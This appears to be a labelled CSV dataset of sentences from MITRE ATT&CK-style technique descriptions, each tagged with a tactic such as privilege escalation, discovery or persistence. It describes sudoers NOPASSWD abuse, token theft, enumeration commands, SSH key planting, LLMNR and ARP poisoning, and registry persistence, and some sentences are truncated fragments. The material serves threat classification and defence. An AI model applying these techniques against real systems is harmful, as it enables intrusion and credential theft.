"The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
This also describes which commands users can run as other users or groups.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Elevated privileges are required to edit this file though.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

"In order for this change to be reflected, the malware also issued killall Terminal.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Windows uses access tokens to determine the ownership of a running process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"When this occurs, the process also takes on the security context associated with the new token.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
These token can then be applied to an existing process (i.e. [Token Impersonation/Theft]) or used to spawn a new process (i.e. [Create Process with Token]).,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
An adversary must already be in a privileged user context (i.e. administrator) to steal a token.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

Adversaries may make and impersonate tokens to escalate privileges and bypass access controls.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the LogonUser function.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"New processes are typically spawned directly from their parent, or calling, process unless explicitly specified.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries may use SID-History Injection to escalate privileges and bypass access controls.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
The Windows security identifier (SID) is a unique value that identifies a user or group account.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
SIDs are used by Windows security in both security descriptors and access tokens. .,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"With Domain Administrator (or equivalent) rights, harvested or well-known SID values .",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex).,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"An adversary may do this when they have a specific, existing process they want to assign the new token to.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"For example, this may be useful for when the target user has a non-network logon session on the system.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.",IMPACT,,,
Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot] to set malicious changes into place.,IMPACT,,,
"In Windows, [Net] utility, Set-LocalUser and Set-ADAccountPassword [PowerShell] cmdlets may be used by adversaries to modify user accounts.",IMPACT,,,

Accounts could also be disabled by Group Policy.,IMPACT,,,
"Adversaries who use ransomware may first perform this and other Impact behaviors, such as [Data Destruction] and [Defacement], before completing the [Data Encrypted for Impact] objective.",IMPACT,,,
Adversaries may attempt to get a listing of accounts on a system or within an environment.,DISCOVERY,,,
This information can help adversaries determine which accounts exist to aid in follow-on behavior.,DISCOVERY,,,
Adversaries may attempt to get a listing of cloud accounts.,DISCOVERY,,,
"Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.",DISCOVERY,,,
With authenticated access there are several tools that can be used to find accounts.,DISCOVERY,,,
The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.,DISCOVERY,,,
The AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix.,DISCOVERY,,,
Adversaries may attempt to get a listing of domain accounts.,DISCOVERY,,,
This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.,DISCOVERY,,,
"Commands such as net user /domain and net group /domain of the [Net] utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain users and groups.",DISCOVERY,,,
Adversaries may attempt to get a listing of email addresses and accounts.,DISCOVERY,,,
Adversaries may try to dump Exchange address lists such as global address lists (GALs).,DISCOVERY,,,
"In on-premises Exchange and Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.",DISCOVERY,,,
"In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service.",DISCOVERY,,,
"Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",DISCOVERY,,,
Adversaries may attempt to get a listing of local system accounts.,DISCOVERY,,,
This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.,DISCOVERY,,,
Commands such as net user and net localgroup of the [Net] utility and id and groupson macOS and Linux can list local users and groups.,DISCOVERY,,,
"On Linux, local users can also be enumerated through the use of the /etc/passwd file.",DISCOVERY,,,
On macOS the dscl . list /Users command can be used to enumerate local accounts.,DISCOVERY,,,
Adversaries may manipulate accounts to maintain access to victim systems.,PERSISTENCE,,,
"Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups.",PERSISTENCE,,,
"These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.",PERSISTENCE,,,
"In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",PERSISTENCE,,,
"However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts].",PERSISTENCE,,,
Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.,PERSISTENCE,,,
Adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.,PERSISTENCE,,,
"In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts], adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP.",PERSISTENCE,,,
An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant.,PERSISTENCE,,,
"For example, they may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.",PERSISTENCE,,,
This account modification may immediately follow [Create Account] or other malicious account activity.,PERSISTENCE,,,
Adversaries may also modify an existing [Valid Accounts] that they have compromised.,PERSISTENCE,,,
"This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.",PERSISTENCE,,,
"For example, in Azure AD environments, an adversary with the Application Administrator role can add [Additional Cloud Credentials] to their application's service principal.",PERSISTENCE,,,
"In doing so the adversary would be able to gain the service principal’s roles and permissions, which may be different from those of the Application Administrator.",PERSISTENCE,,,
Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.,PERSISTENCE,,,
"For example, the Add-MailboxPermission [PowerShell] cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.",PERSISTENCE,,,
Adversaries may also assign mailbox folder permissions through individual folder permissions or roles.,PERSISTENCE,,,
"In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders.",PERSISTENCE,,,
"By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.",PERSISTENCE,,,
This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles] to the accounts they wish to compromise.,PERSISTENCE,,,
This may further enable use of additional techniques for gaining access to systems.,PERSISTENCE,,,
"For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing]), so the messages evade spam/phishing detection mechanisms.",PERSISTENCE,,,
Adversaries may register a device to an adversary-controlled account.,PERSISTENCE,,,
"Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.",PERSISTENCE,,,
"MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements.",PERSISTENCE,,,
An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.,PERSISTENCE,,,
"Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.",PERSISTENCE,,,
"Devices registered in Azure AD may be able to conduct [Internal Spearphishing] campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.",PERSISTENCE,,,
Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host.,PERSISTENCE,,,
Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management.,PERSISTENCE,,,
The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured.,PERSISTENCE,,,
This file is usually found in the user's home directory under &lt;user-home&gt;/.ssh/authorized_keys.,PERSISTENCE,,,
Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled.,PERSISTENCE,,,
The SSH config file is usually located under /etc/ssh/sshd_config.,PERSISTENCE,,,
Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys.,PERSISTENCE,,,
"In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API.",PERSISTENCE,,,
"For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.",PERSISTENCE,,,
"Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user.",PERSISTENCE,,,
"Adversaries may buy, lease, or rent infrastructure that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
A wide variety of infrastructure exists for hosting and orchestrating adversary operations.,RESOURCE_DEVELOPMENT,,,
"Additionally, botnets are available for rent or purchase.",RESOURCE_DEVELOPMENT,,,
"Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation.",RESOURCE_DEVELOPMENT,,,
"Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services.",RESOURCE_DEVELOPMENT,,,
"Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",RESOURCE_DEVELOPMENT,,,
"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.,RESOURCE_DEVELOPMENT,,,
"During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol]).",RESOURCE_DEVELOPMENT,,,
"Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.",RESOURCE_DEVELOPMENT,,,
"By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS]).",RESOURCE_DEVELOPMENT,,,
"With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.",RESOURCE_DEVELOPMENT,,,
Adversaries may purchase domains that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
Domain names are the human readable names used to represent one or more IP addresses.,RESOURCE_DEVELOPMENT,,,
"They can be purchased or, in some cases, acquired for free.",RESOURCE_DEVELOPMENT,,,
"Adversaries can use purchased domains for a variety of purposes, including for [Phishing], [Drive-by Compromise], and Command and Control.",RESOURCE_DEVELOPMENT,,,
Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain.,RESOURCE_DEVELOPMENT,,,
"Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain.",RESOURCE_DEVELOPMENT,,,
Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain.,RESOURCE_DEVELOPMENT,,,
Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.,RESOURCE_DEVELOPMENT,,,
"Adversaries may buy, lease, or rent physical servers that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
"During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.",RESOURCE_DEVELOPMENT,,,
"Instead of compromising a third-party [Server] or renting a [Virtual Private Server], adversaries may opt to configure and run their own servers in support of operations.",RESOURCE_DEVELOPMENT,,,
"Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",RESOURCE_DEVELOPMENT,,,
Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.",RESOURCE_DEVELOPMENT,,,
"Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers.",RESOURCE_DEVELOPMENT,,,
"Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.",RESOURCE_DEVELOPMENT,,,
Adversaries may register for web services that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service]) or [Exfiltration Over Web Service].",RESOURCE_DEVELOPMENT,,,
"Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise.",RESOURCE_DEVELOPMENT,,,
"By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",RESOURCE_DEVELOPMENT,,,
Adversaries may execute active reconnaissance scans to gather information that can be used during targeting.,RECONNAISSANCE,,,
"Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.",RECONNAISSANCE,,,
Adversaries may perform different forms of active scanning depending on what information they seek to gather.,RECONNAISSANCE,,,
"These scans can also be performed in various ways, including using native features of network protocols such as ICMP..",RECONNAISSANCE,,,
"Adversaries may scan IP blocks in order to [Gather Victim Network Information], such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses.",RECONNAISSANCE,,,
Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts..,RECONNAISSANCE,,,
Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.,RECONNAISSANCE,,,
"These scans may also include more broad attempts to [Gather Victim Host Information] that can be used to identify more commonly known, exploitable vulnerabilities.",RECONNAISSANCE,,,
"Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts..",RECONNAISSANCE,,,
Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques.,RECONNAISSANCE,,,
"While this technique employs similar methods to [Brute Force], its goal is the identification of content and infrastructure rather than the discovery of valid credentials.",RECONNAISSANCE,,,
"Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information], or [Search Victim-Owned Websites]).",RECONNAISSANCE,,,
"For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories..",RECONNAISSANCE,,,
"As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",RECONNAISSANCE,,,
Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing] or [Transmitted Data Manipulation].,COLLECTION,CREDENTIAL_ACCESS,,
By abusing features of common networking protocols that can determine the flow of network traffic (e.g.,COLLECTION,CREDENTIAL_ACCESS,,
"ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.",COLLECTION,CREDENTIAL_ACCESS,,
"For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.",COLLECTION,CREDENTIAL_ACCESS,,
"Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation].",COLLECTION,CREDENTIAL_ACCESS,,
"Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses] and/or in support of a [Network Denial of Service].",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices.,COLLECTION,CREDENTIAL_ACCESS,,
This activity may be used to enable follow-on behaviors such as [Network Sniffing] or [Transmitted Data Manipulation].,COLLECTION,CREDENTIAL_ACCESS,,
"The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.",COLLECTION,CREDENTIAL_ACCESS,,
Devices in a local network segment communicate with each other by using link layer addresses.,COLLECTION,CREDENTIAL_ACCESS,,
"If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address.",COLLECTION,CREDENTIAL_ACCESS,,
The device with the associated IP address directly replies with its MAC address.,COLLECTION,CREDENTIAL_ACCESS,,
The networked device that made the ARP request will then use as well as store that information in its ARP cache.,COLLECTION,CREDENTIAL_ACCESS,,
"For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner.",COLLECTION,CREDENTIAL_ACCESS,,
The ARP protocol is stateless and does not require authentication.,COLLECTION,CREDENTIAL_ACCESS,,
"Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.",COLLECTION,CREDENTIAL_ACCESS,,
"This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.",COLLECTION,CREDENTIAL_ACCESS,,
"By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols.",COLLECTION,CREDENTIAL_ACCESS,,
This may also enable follow-on behaviors such as [Network Sniffing] or [Transmitted Data Manipulation].,COLLECTION,CREDENTIAL_ACCESS,,
DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.,COLLECTION,CREDENTIAL_ACCESS,,
"The typical server-client interaction is as follows: 
1. The client broadcasts a `DISCOVER` message.
2. The server responds with an `OFFER` message, which includes an available network address. 
3. The client broadcasts a `REQUEST` message, which includes the network address offered. 
4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.",COLLECTION,CREDENTIAL_ACCESS,,
"For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.",COLLECTION,CREDENTIAL_ACCESS,,
"Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.",COLLECTION,CREDENTIAL_ACCESS,,
"Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e. [Service Exhaustion Flood]) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",COLLECTION,CREDENTIAL_ACCESS,,
This activity may be used to collect or relay authentication materials.,COLLECTION,CREDENTIAL_ACCESS,,
Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification.,COLLECTION,CREDENTIAL_ACCESS,,
LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.,COLLECTION,CREDENTIAL_ACCESS,,
NBT-NS identifies systems on a local network by their NetBIOS name.,COLLECTION,CREDENTIAL_ACCESS,,
"Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system.",COLLECTION,CREDENTIAL_ACCESS,,
"If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system.",COLLECTION,CREDENTIAL_ACCESS,,
The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing] and crack the hashes offline through [Brute Force] to obtain the plaintext passwords.,COLLECTION,CREDENTIAL_ACCESS,,
"In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system.",COLLECTION,CREDENTIAL_ACCESS,,
The relay step can happen in conjunction with poisoning but may also be independent of it.,COLLECTION,CREDENTIAL_ACCESS,,
"Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder].",COLLECTION,CREDENTIAL_ACCESS,,
"Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS.",COMMAND_AND_CONTROL,,,
"For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.",COMMAND_AND_CONTROL,,,
Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,COMMAND_AND_CONTROL,,,
DNS traffic may also be allowed even before network authentication is completed.,COMMAND_AND_CONTROL,,,
DNS packets contain many fields and headers in which data can be concealed.,COMMAND_AND_CONTROL,,,
"Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",COMMAND_AND_CONTROL,,,
Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic.,COMMAND_AND_CONTROL,,,
"Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.",COMMAND_AND_CONTROL,,,
Packets produced from these protocols may have many fields and headers in which data can be concealed.,COMMAND_AND_CONTROL,,,
Data could also be concealed within the transferred files.,COMMAND_AND_CONTROL,,,
"An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",COMMAND_AND_CONTROL,,,

"Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.",COMMAND_AND_CONTROL,,,
Data could also be concealed within the email messages themselves.,COMMAND_AND_CONTROL,,,
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,COMMAND_AND_CONTROL,,,
Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments.,COMMAND_AND_CONTROL,,,
HTTP/S packets have many fields and headers in which data can be concealed.,COMMAND_AND_CONTROL,,,
Window listings could convey information about how the system is used or give context to information collected by a keylogger.,DISCOVERY,,,
Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.,COLLECTION,,,
Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.,COLLECTION,,,
"Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",COLLECTION,,,
An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method.,COLLECTION,,,
"Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references.",COLLECTION,,,
Custom implementations of well-known compression algorithms have also been used.,COLLECTION,,,
"Many libraries exist that can archive data, including [Python] rarfile.",COLLECTION,,,
Most libraries include functionality to encrypt and/or compress data.,COLLECTION,,,
"Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows.",COLLECTION,,,
Note that the libraries are different from the utilities.,COLLECTION,,,
"The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",COLLECTION,,,
Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration.,COLLECTION,,,
"Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.",COLLECTION,,,
Adversaries may abuse various utilities to compress or encrypt data before exfiltration.,COLLECTION,,,
"Some third party utilities may be preinstalled, such as tar on Linux and macOS or zip on Windows systems.",COLLECTION,,,
"On Windows, diantz or makecab may be used to package collected files into a cabinet (.cab) file. diantz may also be used to download and compress files from remote locations (i.e. [Remote Data Staging]).",COLLECTION,,,
"Additionally, xcopy on Windows can copy files and directories with a variety of options.",COLLECTION,,,
"Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",COLLECTION,,,
Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio.,COLLECTION,,,
Audio files may be written to disk and exfiltrated later.,COLLECTION,,,
"Once established within a system or network, an adversary may use automated techniques for collecting internal data.",COLLECTION,,,
"Methods for performing this technique could include use of a [Command and Scripting Interpreter] to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.",COLLECTION,,,
"In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.",COLLECTION,,,
This functionality could also be built into remote access tools.,COLLECTION,,,
"This technique may incorporate use of other techniques such as [File and Directory Discovery] and [Lateral Tool Transfer] to identify and move files, as well as [Cloud Service Dashboard] and [Cloud Storage Object Discovery] to identify resources in cloud environments.",COLLECTION,,,
"When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel] and [Exfiltration Over Alternative Protocol].",EXFILTRATION,,,
Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device.,EXFILTRATION,,,
Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit] or [Patch System Image]. depending on the goals and objectives of the adversary.,EXFILTRATION,,,
"Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model] (COM). without interrupting other networked applications.",DEFENSE_EVASION,PERSISTENCE,,
"File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.",DEFENSE_EVASION,PERSISTENCE,,
The interface to create and manage BITS jobs is accessible through [PowerShell] and the [BITSAdmin] tool.,DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may abuse BITS to download, execute, and even clean up after running malicious code.",DEFENSE_EVASION,PERSISTENCE,,
"BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.",DEFENSE_EVASION,PERSISTENCE,,
BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol].,DEFENSE_EVASION,PERSISTENCE,,
Operating systems may have mechanisms for automatically running a program on system boot or account logon.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Active Setup is a Windows mechanism that is used to execute programs when a user logs in.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The value stored in the Registry key will be executed after a user logs into the computer.,PERSISTENCE,PRIVILEGE_ESCALATION,,
These programs will be executed under the context of the user and will have the account's associated permissions level.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may abuse Active Setup by creating a key under HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ and setting a malicious value for StubPath.,PERSISTENCE,PRIVILEGE_ESCALATION,,
This value will serve as the program that will be executed when a user logs into the computer.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots.",PERSISTENCE,PRIVILEGE_ESCALATION,,

The binary will then be executed by the system when the authentication packages are loaded.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may modify the kernel to automatically execute programs on system boot.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.,PERSISTENCE,PRIVILEGE_ESCALATION,,
They extend the functionality of the kernel without the need to reboot the system.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"When used maliciously, LKMs can be a type of kernel-mode [Rootkit] that run with the highest operating system privilege (Ring 0).",PERSISTENCE,PRIVILEGE_ESCALATION,,
